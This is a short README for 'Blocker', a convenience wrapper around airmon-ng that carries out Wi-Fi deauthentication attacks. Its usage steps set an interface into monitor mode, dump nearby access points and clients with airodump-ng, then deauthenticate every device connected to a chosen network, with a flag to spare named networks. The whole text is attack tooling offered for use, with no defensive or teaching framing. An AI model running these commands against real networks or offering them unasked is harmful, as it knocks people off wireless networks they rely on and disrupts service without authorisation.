# Blocker

Simple convenience layer around `airmon-ng` for deauthentication attacks.

## Usage

1. `airmon-ng start $interface` Configure interface with airmon. This renames the interface name.
1. `airodump-ng --output-format csv -w $file_prefix $interface` Dump access points and clients to csv file.
1. `blocker $csv_path block $target_bssid $interface` Deauthenticate all devices connected to this network.
1. Add the `-e $essid1,$essid2` flag to exclude devices from being deauthenticated.

